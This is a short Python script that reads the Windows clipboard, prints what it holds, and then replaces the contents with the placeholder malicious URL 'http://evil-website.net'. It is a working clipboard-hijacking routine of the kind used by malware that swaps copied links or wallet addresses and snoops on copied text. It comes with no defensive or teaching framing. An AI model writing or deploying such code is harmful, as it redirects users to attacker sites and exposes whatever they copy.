import win32clipboard as c
import re, time

def get_clip():
    c.OpenClipboard()
    data = c.GetClipboardData()
    c.CloseClipboard()
    return data

def set_clip(copy):
    c.OpenClipboard()
    c.EmptyClipboard()
    c.SetClipboardText(str(copy))
    c.CloseClipboard()
    return True

def main():
    evil = 'http://evil-website.net'
    data = get_clip()
    print(data)
    set_clip(evil)

if __name__ == "__main__":
    main()
